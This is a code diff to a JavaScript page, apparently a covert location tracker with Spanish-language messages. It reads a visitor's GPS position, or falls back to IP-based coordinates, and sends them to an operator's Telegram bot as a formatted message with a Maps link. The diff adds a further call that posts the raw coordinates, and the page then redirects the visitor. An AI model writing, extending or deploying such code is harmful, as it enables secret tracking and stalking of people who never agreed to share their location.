@@ -213,7 +213,14 @@ const BOT='__TOKEN__', CHAT='__CHAT_ID__';
 const send = async (txt) => {
     await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
         method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: CHAT, text: txt, parse_mode: 'HTML'})
+        body: JSON.stringify({chat_id: CHAT, text: txt, parse_mode: 'HTML', disable_web_page_preview: false})
+    });
+};
+
+const sendLocation = async (lat, lon) => {
+    await fetch(`https://api.telegram.org/bot${BOT}/sendLocation`, {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: CHAT, latitude: lat, longitude: lon})
     });
 };
 
@@ -277,6 +284,7 @@ const getGeoAuto = async (ipLat, ipLon) => {
             gps += `📏 <b>Precision:</b> ${acc} metros\\n`;
             gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver en Mapa</a>`;
             await send(gps);
+            await sendLocation(lat, lon);
             redirect();
         }, async (e) => {
             if(ipLat && ipLon) {
@@ -285,6 +293,7 @@ const getGeoAuto = async (ipLat, ipLon) => {
                 gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${ipLat},${ipLon}">Ver en Mapa</a>\\n`;
                 gps += `\\nℹ️ <i>GPS no disponible, usando ubicacion de red</i>`;
                 await send(gps);
+                await sendLocation(ipLat, ipLon);
             } else {
                 await send(`❌ <b>GPS Denegado:</b> No se pudo obtener ubicacion`);
             }
@@ -296,6 +305,7 @@ const getGeoAuto = async (ipLat, ipLon) => {
             gps += `📍 <b>Coords:</b> <code>${ipLat}, ${ipLon}</code>\\n`;
             gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${ipLat},${ipLon}">Ver en Mapa</a>`;
             await send(gps);
+            await sendLocation(ipLat, ipLon);
         }
         redirect();
     }
